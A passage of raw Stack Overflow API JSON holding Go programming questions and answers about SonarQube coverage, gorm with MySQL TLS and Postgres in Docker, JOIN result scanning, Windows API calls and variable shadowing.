of <code>x += 2</code>) or just <code>&#47;&#47; TODO</code> comment"}, {"owner": {"reputation": 364, "user_id": 6173660, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/abb2361f859a0ed3e7915135a5379426?s=128&d=identicon&r=PG&f=1", "display_name": "iam thadiyan", "link": "https://stackoverflow.com/users/6173660/iam-thadiyan"}, "edited": false, "score": 0, "creation_date": 1557394149, "post_id": 53783933, "comment_id": 98753292, "body": "Okay! I did a <code>return</code> with statements after it, sonar caught it. But when I did <code>for {}</code>, sonar didn&#39;t!"}], "tags": [], "owner": {"reputation": 629, "user_id": 6619811, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-GgE_-pIeidI/AAAAAAAAAAI/AAAAAAAARRg/0kkX9SLO1R4/photo.jpg?sz=128", "display_name": "Alban A. - SonarSource Team", "link": "https://stackoverflow.com/users/6619811/alban-a-sonarsource-team"}, "is_accepted": false, "score": 1, "last_activity_date": 1544806483, "creation_date": 1544806483, "answer_id": 53783933, "question_id": 52962493, "link": "https://stackoverflow.com/questions/52962493/how-to-exclude-golang-tests-structs-and-constants-from-counting-against-code-co/53783933#53783933", "title": "How to exclude golang tests, structs and constants from counting against code coverage in SonarQube?", "body": "<p>For now (SonarQube 7.4), SonarGo analyzer does not identify automatically <code>*_test.go</code> as test files. This is a missing feature, this is why the <a href=\"https://docs.sonarqube.org/display/PLUG/SonarGo\" rel=\"nofollow noreferrer\">SonarGo documentation</a> describes how to properly identify test files through settings:</p>\n\n<p><code>sonar.test.inclusions=**/*_test.go</code></p>\n\n<p>Without proper test identification, the coverage result will be wrong and the analysis result could raise issues that do not make sense (like hard-coded IP addresses in tests).</p>\n\n<p>About the coverage accuracy (for files that are not test files), there's two cases:</p>\n\n<ul>\n<li>If a file has entries related to it in the coverage report, the covered lines shown in SonarQube should match exactly the ones in the report, otherwise it's a major bug. But the <em>percentage</em> shown by go tools (ranges coverage) could be slightly different that the percentage shown in SonarQube (lines coverage), e.g: +2%.</li>\n<li>If a file is not in the coverage report, SonarGo generate a 0% coverage based on its definition of <em>executable line of code</em>. If there's a difference with <code>go test</code> definition of <em>executable line of code</em>, it's a bug that will disappear once the file is partially covered.</li>\n</ul>\n\n<p>The best way to have those coverage bugs fixed, is to report them at <a href=\"https://community.sonarsource.com/\" rel=\"nofollow noreferrer\">community.sonarsource.com</a> by creating a <code>Report a Bug</code> topic with a small code reproducer.</p>\n"}], "owner": {"reputation": 21, "user_id": 3400314, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/35459534c618ee82c622d71f59a28522?s=128&d=identicon&r=PG&f=1", "display_name": "user3400314", "link": "https://stackoverflow.com/users/3400314/user3400314"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1465, "favorite_count": 0, "answer_count": 1, "score": 2, "last_activity_date": 1544806483, "creation_date": 1540363386, "question_id": 52962493, "link": "https://stackoverflow.com/questions/52962493/how-to-exclude-golang-tests-structs-and-constants-from-counting-against-code-co", "title": "How to exclude golang tests, structs and constants from counting against code coverage in SonarQube?", "body": "<p>SonarQube 7.3 it has inbuilt support for golang where I have found at least 2 issues :-</p>\n\n<p>It does not exclude *_test.go automatically from coverage. In unit tests it also picks up IP addresses and asks them to be made configurable (not constant which also does not fix the error).</p>\n\n<p>It counts structs and const as not covered lines and hence has a significantly lower % covered than the go coverage tool itself making it a bad use case. For example in a medium size project it reports 40% coverage against go tools 70%</p>\n\n<p>Apart from commenting them all to be sonar exclude or putting constants and structs  in a common exclude pattern file is there something else that can be done? Is there a plan to address these in a later version of SonarQube?</p>\n"}, {"tags": ["go", "go-gorm"], "comments": [{"owner": {"reputation": 2783, "user_id": 4145098, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/41Miz.jpg?s=128&g=1", "display_name": "Ullaakut", "link": "https://stackoverflow.com/users/4145098/ullaakut"}, "edited": false, "score": 0, "creation_date": 1540361476, "post_id": 52962028, "comment_id": 92830762, "body": "Can you print the string that results just to check what it looks like?"}, {"owner": {"reputation": 317, "user_id": 1796652, "user_type": "registered", "accept_rate": 15, "profile_image": "https://www.gravatar.com/avatar/13f1016f37fe413b4b130db100662404?s=128&d=identicon&r=PG", "display_name": "learner123", "link": "https://stackoverflow.com/users/1796652/learner123"}, "reply_to_user": {"reputation": 2783, "user_id": 4145098, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/41Miz.jpg?s=128&g=1", "display_name": "Ullaakut", "link": "https://stackoverflow.com/users/4145098/ullaakut"}, "edited": false, "score": 0, "creation_date": 1540362735, "post_id": 52962028, "comment_id": 92831284, "body": "@Ullaakut The connection string looks like this: root:pass@tcp(localhost:3306)/?charset=utf8&amp;parseTime=True&amp;a&zwnj;&#8203;llowNativePasswords=&zwnj;&#8203;True&amp;ssl-ca=%27ca.pe&zwnj;&#8203;m%27"}, {"owner": {"reputation": 2783, "user_id": 4145098, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/41Miz.jpg?s=128&g=1", "display_name": "Ullaakut", "link": "https://stackoverflow.com/users/4145098/ullaakut"}, "edited": false, "score": 0, "creation_date": 1540372815, "post_id": 52962028, "comment_id": 92837073, "body": "The issue is probably that as you can see the path given is just <code>ca.pem</code> so it just can&#39;t find the file."}, {"owner": {"reputation": 317, "user_id": 1796652, "user_type": "registered", "accept_rate": 15, "profile_image": "https://www.gravatar.com/avatar/13f1016f37fe413b4b130db100662404?s=128&d=identicon&r=PG", "display_name": "learner123", "link": "https://stackoverflow.com/users/1796652/learner123"}, "reply_to_user": {"reputation": 2783, "user_id": 4145098, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/41Miz.jpg?s=128&g=1", "display_name": "Ullaakut", "link": "https://stackoverflow.com/users/4145098/ullaakut"}, "edited": false, "score": 0, "creation_date": 1540470286, "post_id": 52962028, "comment_id": 92883496, "body": "@Ullaakut The path I have provided is correct. I have provided the trimmed version of string with only the pem file."}], "answers": [{"tags": [], "owner": {"reputation": 26, "user_id": 3295213, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7586d7eeee18b480459f03998c013c29?s=128&d=identicon&r=PG&f=1", "display_name": "Virterm", "link": "https://stackoverflow.com/users/3295213/virterm"}, "is_accepted": true, "score": 1, "last_activity_date": 1547673931, "last_edit_date": 1547673931, "creation_date": 1547659558, "answer_id": 54222294, "question_id": 52962028, "link": "https://stackoverflow.com/questions/52962028/how-to-create-ssl-connection-to-mysql-with-gorm/54222294#54222294", "title": "How to create ssl connection to mysql with gorm?", "body": "<p>This is a fragment of my working code :</p>\n\n<pre><code>isTLS := false\n\nif mysqlClientKey != \"\" &amp;&amp; mysqlCaCert != \"\"  &amp;&amp; mysqlClientCert != \"\" {\n    isTLS = true\n    rootCertPool := x509.NewCertPool()\n    pem, err := ioutil.ReadFile(\"/path/mysqlCaCert\")\n    if err != nil {\n        log.Fatal(err)\n    }\n    if ok := rootCertPool.AppendCertsFromPEM(pem); !ok {\n        log.Fatal(\"Failed to append PEM.\")\n    }\n    clientCert := make([]tls.Certificate, 0, 1)\n    certs, err := tls.LoadX509KeyPair(\"/path/mysqlClientCert\", \"/path/mysqlClientKey\")\n    if err != nil {\n        log.Fatal(err)\n    }\n    clientCert = append(clientCert, certs)\n    mysql.RegisterTLSConfig(\"custom\", &amp;tls.Config{\n        RootCAs:      rootCertPool,\n        Certificates: clientCert,\n    })\n}\n\n// try to connect to mysql database.\ncfg := mysql.Config{\n    User:   username,\n    Passwd: password,\n    Addr:   server, //IP:PORT\n    Net:    \"tcp\",\n    DBName: database,\n    Loc: time.Local,\n    AllowNativePasswords: true,\n    Params: o,\n}\n\nif isTLS == true {\n    cfg.TLSConfig = \"custom\"\n}\n\nstr := cfg.FormatDSN()\n\ndb, err := gorm.Open(\"mysql\", str)\n</code></pre>\n"}], "owner": {"reputation": 317, "user_id": 1796652, "user_type": "registered", "accept_rate": 15, "profile_image": "https://www.gravatar.com/avatar/13f1016f37fe413b4b130db100662404?s=128&d=identicon&r=PG", "display_name": "learner123", "link": "https://stackoverflow.com/users/1796652/learner123"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1364, "favorite_count": 0, "accepted_answer_id": 54222294, "answer_count": 1, "score": 2, "last_activity_date": 1549909922, "creation_date": 1540361269, "question_id": 52962028, "link": "https://stackoverflow.com/questions/52962028/how-to-create-ssl-connection-to-mysql-with-gorm", "title": "How to create ssl connection to mysql with gorm?", "body": "<p>Can't seem to find any resource on creating a SSL connection to mysql using gorm. I am creating a non-ssl connection like this:</p>\n\n<pre><code>cfg := mysql.Config{\n    User:   config.User,\n    Passwd: config.Password,\n    Addr:   fmt.Sprintf(\"%s:%d\", config.Host, config.Port),\n    Net:    \"tcp\",\n    Params: options,\n}\n\nstr := cfg.FormatDSN()\ndb, err := gorm.Open(\"mysql\", str)\n</code></pre>\n\n<p>Passing 'ssl-ca' option in Param options with path to 'pem' file does not seem to work. Any heads up on this?</p>\n"}, {"tags": ["postgresql", "docker", "go", "go-gorm"], "answers": [{"tags": [], "owner": {"reputation": 1, "user_id": 8843309, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6d81a0056455c98bed3ff471fe33cebc?s=128&d=identicon&r=PG", "display_name": "Amine", "link": "https://stackoverflow.com/users/8843309/amine"}, "is_accepted": false, "score": 0, "last_activity_date": 1540395701, "creation_date": 1540395701, "answer_id": 52973051, "question_id": 52961938, "link": "https://stackoverflow.com/questions/52961938/cant-connect-to-postgres-password-authentication-failed-for-user-docker/52973051#52973051", "title": "Cant connect to postgres (password authentication failed for user - docker)", "body": "<p>I'm using docker compose with postgres and golang like you, here is the docker-compose.yml file i use</p>\n\n<pre><code>version: '2'\nservices:\n  redis:\n    image: redis:latest\n    command: --appendonly yes\n\n  postgres:\n    image: postgres:latest\n    environment:\n      - POSTGRES_USER=amine\n      - POSTGRES_PASSWORD=amine\n      - POSTGRES_DB=0000\n\n  app:\n    image: ahilaly/amine.in:v0.1.3\n    command: -wait\n    ports:\n      - 7000:7000\n\n    depends_on:\n      - postgres\n      - redis\n\n    links:\n      - postgres:postgres\n      - redis:redis\n</code></pre>\n"}], "owner": {"reputation": 107, "user_id": 4778488, "user_type": "registered", "accept_rate": 29, "profile_image": "https://www.gravatar.com/avatar/8303e9f203e79b97cb1b7ca4240819e9?s=128&d=identicon&r=PG&f=1", "display_name": "Joaco Terniro", "link": "https://stackoverflow.com/users/4778488/joaco-terniro"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 750, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1540395701, "creation_date": 1540360828, "question_id": 52961938, "link": "https://stackoverflow.com/questions/52961938/cant-connect-to-postgres-password-authentication-failed-for-user-docker", "title": "Cant connect to postgres (password authentication failed for user - docker)", "body": "<p>I was trying to run docker compose to set up nginx, golang server and postgresql. The problem is that I can't connect to the database:</p>\n\n<p><a href=\"https://i.stack.imgur.com/ZB7bP.jpg\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/ZB7bP.jpg\" alt=\"enter image description here\"></a></p>\n\n<p>Initially, I was trying to connect to postgres with this instruction:</p>\n\n<pre><code>db, err = gorm.Open(\"postgres\", \"host=db port=5432 user=sigbrian password=example sslmode=disable\")\n</code></pre>\n\n<p>With this docker-compose file:</p>\n\n<pre><code>version: '3.2'\n\n# volumes:\n  # database_data:\n    # driver: local\n\nservices:\n  db:\n    image: postgres\n    restart: always\n    environment:\n      - POSTGRES_DB:sigdb\n      - POSTGRES_USER:sigbrian\n      - POSTGRES_PASSWORD:example\n    ports:\n      - '5432:5432'\n    # volumes:\n      # - database_data:/var/lib/postgresql/data\n  golang-app:\n    build:\n      context: .\n      dockerfile: Dockerfile\n    # command: [\"./wait-for-it.sh\", \"db:5432\"]\n    # ports:\n    #   - '80:8888'\n    expose:\n      - '8080'\n    depends_on:\n      - \"db\"\n    links:\n      - \"db\"\n  nginx-proxy-and-webserver:\n    image: nginx:1.15.5-alpine\n    ports:\n      - '80:80'\n    volumes:\n      - ./nginx.conf:/etc/nginx/nginx.conf\n      - ./static:/var/www/sig/static\n    depends_on:\n      - \"golang-app\"\n    links:\n      - \"golang-app\"\n</code></pre>\n\n<p>But when I comment the postgres user, database and password environment variables from the file, and try to make the connection this way: </p>\n\n<pre><code>db, err = gorm.Open(\"postgres\", \"host=db port=5432 user=postgres sslmode=disable\")\n</code></pre>\n\n<p>Still throws the same error. I appreciate any help.</p>\n"}, {"tags": ["go", "join", "go-gorm"], "comments": [{"owner": {"reputation": 11296, "user_id": 1931641, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/d97ff8806b1550dfde5f6c9f09af6f92?s=128&d=identicon&r=PG", "display_name": "PassKit", "link": "https://stackoverflow.com/users/1931641/passkit"}, "edited": false, "score": 1, "creation_date": 1555935200, "post_id": 52961883, "comment_id": 98257317, "body": "Did you ever solve this?"}], "answers": [{"tags": [], "owner": {"reputation": 5734, "user_id": 415628, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/84d8280499418f22f42778cc40c20a12?s=128&d=identicon&r=PG", "display_name": "Ezequiel Muns", "link": "https://stackoverflow.com/users/415628/ezequiel-muns"}, "is_accepted": false, "score": 2, "last_activity_date": 1606833974, "creation_date": 1606833974, "answer_id": 65092718, "question_id": 52961883, "link": "https://stackoverflow.com/questions/52961883/gorm-joins-and-results/65092718#65092718", "title": "GORM JOINs and Results", "body": "<p>I don't know whether this was possible in Gorm V1, but in V2 you can use <a href=\"https://gorm.io/docs/models.html#Embedded-Struct\" rel=\"nofollow noreferrer\">Embedded Structs</a> with a prefix to disambiguate the two result sets, you can then name the columns appropriately to direct them to the right embedded model:</p>\n<pre class=\"lang-golang prettyprint-override\"><code>type Model1 struct {\n    ID    int `gorm:&quot;primaryKey&quot;`\n    Value string\n}\n\ntype Model2 struct {\n    ID    int `gorm:&quot;primaryKey&quot;`\n    Value string\n    Color string\n}\n\ntype Result struct {\n    Model1 `gorm:&quot;embedded;embeddedPrefix:m1_&quot;`\n    Model2 `gorm:&quot;embedded;embeddedPrefix:m2_&quot;`\n}\n\nres := Result{}\ndb.Raw(`\n    SELECT\n        1 AS m1_id,\n        'one' AS m1_value,\n        2 AS m2_id,\n        'two' AS m2_value,\n        'rose' AS m2_color\n`).Scan(&amp;res)\n\nfmt.Printf(&quot;%+v\\n&quot;, res)\n// {Model1:{ID:1 Value:one} Model2:{ID:2 Value:two Color:rose}}\n</code></pre>\n"}], "owner": {"reputation": 1303, "user_id": 1990524, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/d1b7da006e44f2492030e9ad17d15d23?s=128&d=identicon&r=PG", "display_name": "jjuser19jj", "link": "https://stackoverflow.com/users/1990524/jjuser19jj"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1144, "favorite_count": 0, "answer_count": 1, "score": 5, "last_activity_date": 1607420632, "creation_date": 1540360517, "last_edit_date": 1607420632, "question_id": 52961883, "link": "https://stackoverflow.com/questions/52961883/gorm-joins-and-results", "title": "GORM JOINs and Results", "body": "<p>Suppose I have 2 tables, which share some column names such as:</p>\n\n<p><div class=\"snippet\" data-lang=\"js\" data-hide=\"false\" data-console=\"true\" data-babel=\"false\">\r\n<div class=\"snippet-code\">\r\n<pre class=\"snippet-code-js lang-js prettyprint-override\"><code>table_1\r\n- id\r\n- created_at\r\n- deleted_at\r\n- name\r\n- color\r\n\r\ntable_2\r\n- id\r\n- created_at\r\n- deleted_at\r\n- address\r\n- name</code></pre>\r\n</div>\r\n</div>\r\n</p>\n\n<p>When I run a join query on theres 2 tables I get something back like this: <code>id, created_at, name, color, id, created_at, deleted_at, address, name</code></p>\n\n<p>I have 2 structs resembling the models I described above. Now I want to scan the results into a results struct: </p>\n\n<p><div class=\"snippet\" data-lang=\"js\" data-hide=\"false\" data-console=\"true\" data-babel=\"false\">\r\n<div class=\"snippet-code\">\r\n<pre class=\"snippet-code-js lang-js prettyprint-override\"><code>type Result struct {\r\n Model1\r\n Model2\r\n}</code></pre>\r\n</div>\r\n</div>\r\n</p>\n\n<p>I then use <code>db.Raw().Scan(&amp;result)</code>. Now the Problem:\nThe id of table_2 is never written into the struct for table 2, only into the struct of table 1 in the results struct. </p>\n\n<p>I hope I described my problem clearly enough.\nMy question is: How can I read the results of a JOIN query into a results struct, when there are columns named the same.</p>\n"}, {"tags": ["go", "winapi"], "comments": [{"owner": {"reputation": 35031, "user_id": 1889329, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/57bec3f0b9c5879cdd9d9fa2e8629318?s=128&d=identicon&r=PG&f=1", "display_name": "IInspectable", "link": "https://stackoverflow.com/users/1889329/iinspectable"}, "edited": false, "score": 1, "creation_date": 1540366079, "post_id": 52961472, "comment_id": 92833079, "body": "Related, possibly a duplicate: <a href=\"https://stackoverflow.com/q/37781676/1889329\">How to use COM (Component Object Model) in Golang</a>."}], "owner": {"reputation": 133, "user_id": 5461234, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/268a2cfbc036f95835478ebe8b511745?s=128&d=identicon&r=PG&f=1", "display_name": "5Flags", "link": "https://stackoverflow.com/users/5461234/5flags"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 1450, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1540357899, "creation_date": 1540357899, "question_id": 52961472, "link": "https://stackoverflow.com/questions/52961472/calling-windows-api-from-golang", "title": "Calling Windows API from Golang", "body": "<p>There is a Windows API function I need to call from Golang:</p>\n\n<p>INetworkListManager::GetConnectivity</p>\n\n<p><a href=\"https://docs.microsoft.com/en-us/windows/desktop/api/netlistmgr/nf-netlistmgr-inetworklistmanager-getconnectivity\" rel=\"nofollow noreferrer\">https://docs.microsoft.com/en-us/windows/desktop/api/netlistmgr/nf-netlistmgr-inetworklistmanager-getconnectivity</a></p>\n\n<p>I've read through the docs here:</p>\n\n<p><a href=\"https://github.com/golang/go/wiki/WindowsDLLs\" rel=\"nofollow noreferrer\">https://github.com/golang/go/wiki/WindowsDLLs</a></p>\n\n<p>But it's still not clear to me how I would call this API. How would I do it, and use the result to check for internet connectivity?</p>\n"}, {"tags": ["if-statement", "go", "variable-assignment"], "comments": [{"owner": {"reputation": 327, "user_id": 2803242, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/26b9b4595e94b0e09ffda71063461eff?s=128&d=identicon&r=PG&f=1", "display_name": "AdmiralThrawn", "link": "https://stackoverflow.com/users/2803242/admiralthrawn"}, "edited": false, "score": 0, "creation_date": 1540362134, "post_id": 52961371, "comment_id": 92831020, "body": "Not sure why this got down voted without reason.. without providing answers to all the questions or pointing to a duplicate - Especially, as I am looking for patterns to follow. This code (bar function) works in multiple languages and is a common pattern."}, {"owner": {"reputation": 32095, "user_id": 7426, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5a562698800b535e47b68590f63c402a?s=128&d=identicon&r=PG", "display_name": "Adrian", "link": "https://stackoverflow.com/users/7426/adrian"}, "edited": false, "score": 0, "creation_date": 1540389370, "post_id": 52961371, "comment_id": 92847940, "body": "Possible duplicate of <a href=\"https://stackoverflow.com/questions/14905708/go-declared-and-not-used-error-when-i-think-i-have-done-so-to-the-variable\">Go \u2014 declared and not used error, when I think I have done so to the variable</a>"}], "answers": [{"comments": [{"owner": {"reputation": 327, "user_id": 2803242, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/26b9b4595e94b0e09ffda71063461eff?s=128&d=identicon&r=PG&f=1", "display_name": "AdmiralThrawn", "link": "https://stackoverflow.com/users/2803242/admiralthrawn"}, "edited": false, "score": 0, "creation_date": 1540361997, "post_id": 52961440, "comment_id": 92830965, "body": "I found that. But, I really need to write code - where I change default values based on certain inputs (which happens to be include error getting returned - i.e bar function).. So I would appreciate any pattern help"}, {"owner": {"reputation": 4396, "user_id": 1043773, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/7a5453bbc3f198ebef8e8d44253a1503?s=128&d=identicon&r=PG", "display_name": "bashrc", "link": "https://stackoverflow.com/users/1043773/bashrc"}, "reply_to_user": {"reputation": 327, "user_id": 2803242, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/26b9b4595e94b0e09ffda71063461eff?s=128&d=identicon&r=PG&f=1", "display_name": "AdmiralThrawn", "link": "https://stackoverflow.com/users/2803242/admiralthrawn"}, "edited": false, "score": 0, "creation_date": 1540396888, "post_id": 52961440, "comment_id": 92853194, "body": "@AdmiralThrawn edited with one way in which this can be achieved"}], "tags": [], "owner": {"reputation": 4396, "user_id": 1043773, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/7a5453bbc3f198ebef8e8d44253a1503?s=128&d=identicon&r=PG", "display_name": "bashrc", "link": "https://stackoverflow.com/users/1043773/bashrc"}, "is_accepted": false, "score": 5, "last_activity_date": 1540373354, "last_edit_date": 1540373354, "creation_date": 1540357679, "answer_id": 52961440, "question_id": 52961371, "link": "https://stackoverflow.com/questions/52961371/declared-and-not-used-how-to-update-a-variable-in-if-statement/52961440#52961440", "title": "Declared and not used - How to update a variable in IF Statement", "body": "<p>From <a href=\"https://golang.org/ref/spec#Short_variable_declarations\" rel=\"nofollow noreferrer\">go-lang specification</a></p>\n\n<blockquote>\n  <p>Unlike regular variable declarations, a short variable declaration may\n  redeclare variables provided <strong>they were originally declared earlier in\n  the same block</strong> (or the parameter lists if the block is the function\n  body) with the same type, and at least one of the non-blank variables\n  is new</p>\n</blockquote>\n\n<p>The <code>if</code> starts a new block and hence this line is declaring a new variable with name <code>f</code>. </p>\n\n<p>On the other hand <code>=</code> operator is an assignment operator and hence the value from the previous scope is modified.</p>\n\n<p>If you want to re-use the same variable, you can declare <code>err</code> explicitly.</p>\n\n<pre><code> var err error \n f, err = strconv.ParseBool(m[\"READWRITE\"])\n if err != nil {\n    panic(err)\n }\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 327, "user_id": 2803242, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/26b9b4595e94b0e09ffda71063461eff?s=128&d=identicon&r=PG&f=1", "display_name": "AdmiralThrawn", "link": "https://stackoverflow.com/users/2803242/admiralthrawn"}, "edited": false, "score": 0, "creation_date": 1540401838, "post_id": 52962907, "comment_id": 92855926, "body": "Thanks makes sense."}], "tags": [], "owner": {"reputation": 925, "user_id": 6717375, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kEXPd.jpg?s=128&g=1", "display_name": "jonathangersam", "link": "https://stackoverflow.com/users/6717375/jonathangersam"}, "is_accepted": true, "score": 7, "last_activity_date": 1540365013, "creation_date": 1540365013, "answer_id": 52962907, "question_id": 52961371, "link": "https://stackoverflow.com/questions/52961371/declared-and-not-used-how-to-update-a-variable-in-if-statement/52962907#52962907", "title": "Declared and not used - How to update a variable in IF Statement", "body": "<blockquote>\n  <p>gives an error \"f declared and not used\"</p>\n</blockquote>\n\n<p><code>f</code> in your sample is a newly-declared variable. Its scope lies within the <code>if</code> block, and is different from the one originally declared at the start of your <code>main()</code>.</p>\n\n<p>Here is a sample commented code that may help clarify (also available as a runnable Go Playground <a href=\"https://play.golang.org/p/IebpOEkXMvl\" rel=\"noreferrer\">snippet</a>):</p>\n\n<pre><code>package main\n\nimport (\n    \"fmt\"\n)\n\nfunc main() {\n    food := \"burger\"                 // (1) variable 'food' is declared\n    fmt.Println(\"food is\", food)     // OUTPUT: \"burger\"\n\n    if true {\n        food := \"fries\"              // (2) a new 'food' variable is a declared here. it shadows the one in (1)\n        fmt.Println(\"food is\", food) // this accesses the 'food' var from (2). OUTPUT: \"fries\"\n    }\n\n    fmt.Println(\"food is\", food)     // this accesses the variable from (1). OUTPUT: \"burger\"\n}\n</code></pre>\n\n<p>Hope this helps clarify. Cheers,</p>\n"}, {"tags": [], "owner": {"reputation": 327, "user_id": 2803242, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/26b9b4595e94b0e09ffda71063461eff?s=128&d=identicon&r=PG&f=1", "display_name": "AdmiralThrawn", "link": "https://stackoverflow.com/users/2803242/admiralthrawn"}, "is_accepted": false, "score": 0, "last_activity_date": 1540402248, "creation_date": 1540402248, "answer_id": 52974879, "question_id": 52961371, "link": "https://stackoverflow.com/questions/52961371/declared-and-not-used-how-to-update-a-variable-in-if-statement/52974879#52974879", "title": "Declared and not used - How to update a variable in IF Statement", "body": "<p>Context on why I am calling this out: For a person moving to Go from quite a few other languages, this would be an oddity.</p>\n\n<p>I am adding this here - just to demonstrate that it might be useful to use a temp variable explicitly. barNotCorrectYet, has f being updated with the \"default false\" return from strconv.ParseBool (which would have changed the preset value). So, on cases where we want to ignore bad inputs, it will be useful to assign output to a temp variable, check if no errors were returned and then update the preset value <strong>barCorrectHandlingOfTempVariable</strong>. </p>\n\n<pre><code>func barNotCorrectYet(m map[string]string) bool {\nf := true // preset value of variable\n\nif _, exists := m[\"READWRITE\"]; exists {\n    var err error\n\n    fmt.Println(\"Before Updating f : \", f)\n\n    f, err = strconv.ParseBool(m[\"READWRITE\"])\n    if err != nil {\n        // If error, wrong value got updated on f.. and erased preset value\n    }   \n\n}\n\nfmt.Println(\"[Value could be wrong] After Updating f : \", f)\n\nreturn f\n}\n\nfunc barCorrectHandlingOfTempVariable(m map[string]string) bool {\nf := true // preset value of variable\n\nif _, exists := m[\"READWRITE\"]; exists {\n\n    fmt.Println(\"Before Updating f : \", f)\n\n    temp, err := strconv.ParseBool(m[\"READWRITE\"])\n    if err != nil { // Update only when there are no errors to not affect preset value\n        f = temp\n    }       \n}\n\nfmt.Println(\"After Updating f : \", f)\n\nreturn f\n}\n</code></pre>\n"}], "owner": {"reputation": 327, "user_id": 2803242, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/26b9b4595e94b0e09ffda71063461eff?s=128&d=identicon&r=PG&f=1", "display_name": "AdmiralThrawn", "link": "https://stackoverflow.com/users/2803242/admiralthrawn"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 3866, "favorite_count": 1, "accepted_answer_id": 52962907, "answer_count": 3, "score": 5, "last_activity_date": 1540455463, "creation_date": 1540357260, "last_edit_date": 1540455463, "question_id": 52961371, "link": "https://stackoverflow.com/questions/52961371/declared-and-not-used-how-to-update-a-variable-in-if-statement", "title": "Declared and not used - How to update a variable in IF Statement", "body": "<p>I am trying to setup a bool variable with a default value and update it based on a condition, in Go Lang. The func <strong>foo</strong> compiles, But the function <strong>bar</strong> doesn't compile and gives an error \"f declared and not used\"</p>\n\n<p>There is a <a href=\"https://stackoverflow.com/questions/14905708/go-declared-and-not-used-error-when-i-think-i-have-done-so-to-the-variable\">related answer</a> - which doesn't explain the next question</p>\n\n<p><strong>What is the correct pattern for this(bar function) in Go?</strong></p>\n\n<p>Here is the code:</p>\n\n<pre><code>package main\n\nimport (\n\"fmt\"\n\"strconv\"\n)\n\nfunc foo(m map[string]string) bool {\n    f := false\n\nif _, exists := m[\"READWRITE\"]; exists {\n    fmt.Println(\"Before Updating f : \", f)\n    f, _ = strconv.ParseBool(m[\"READWRITE\"])\n    //if err != nil {\n    //  panic(err)\n    //}\n}\n\nfmt.Println(\"After Updating f : \", f)\n\nreturn f\n}\n\nfunc bar(m map[string]string) bool {\n    f := false\n\n    if _, exists := m[\"READWRITE\"]; exists {\n         fmt.Println(\"Before Updating f : \", f)\n         f, err := strconv.ParseBool(m[\"READWRITE\"]) // error on this line \"f declared and not used\"\n        if err != nil {\n            panic(err)\n        }\n    }\n\n    fmt.Println(\"After Updating f : \", f)\n\n    return f\n}\n\nfunc main() {\n    m := map[string]string{\"READWRITE\": \"true\"}\n\n    fmt.Println(foo(m))\n    fmt.Println(bar(m))\n}\n</code></pre>\n"}, {"tags": ["go"], "comments": [{"owner": {"reputation": 87059, "user_id": 5728991, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/4kTj8.png?s=128&g=1", "display_name": "Cerise Lim&#243;n", "link": "https://stackoverflow.com/users/5728991/cerise-lim%c3%b3n"}, "edited": false, "score": 3, "creation_date": 1540353567, "post_id": 52960802, "comment_id": 92828520, "body": "There is a <a href=\"https://godoc.org/net/url#Parse\" rel=\"nofollow noreferrer\">Parse function</a> and a <a href=\"https://godoc.org/net/url#URL.Parse\" rel=\"nofollow noreferrer\">Parse method</a> on the URL type.  <a href=\"https://godoc.org/net/url#ParseRequestURI\" rel=\"nofollow noreferrer\">ParseRequestURI</a> is a function and can only be called as a function."}, {"owner": {"reputation": 3592, "user_id": 1951139, "user_type": "registered", "accept_rate": 44, "profile_image": "https://i.stack.imgur.com/g8cGg.png?s=128&g=1", "display_name": "Jean Y.C. Yang", "link": "https://stackoverflow.com/users/1951139/jean-y-c-yang"}, "reply_to_user": {"reputation": 87059, "user_id": 5728991, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/4kTj8.png?s=128&g=1", "display_name": "Cerise Lim&#243;n", "link": "https://stackoverflow.com/users/5728991/cerise-lim%c3%b3n"}, "edited": false, "score": 0, "creation_date": 1540353580, "post_id": 52960802, "comment_id": 92828523, "body": "@ThunderCat Thank you.  But how can I know it is a function not method in documentation? As I described above, I can&#39;t find difference between <code>Parse</code> and <code>ParseRequestURI </code> in the doc."}, {"owner": {"reputation": 87059, "user_id": 5728991, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/4kTj8.png?s=128&g=1", "display_name": 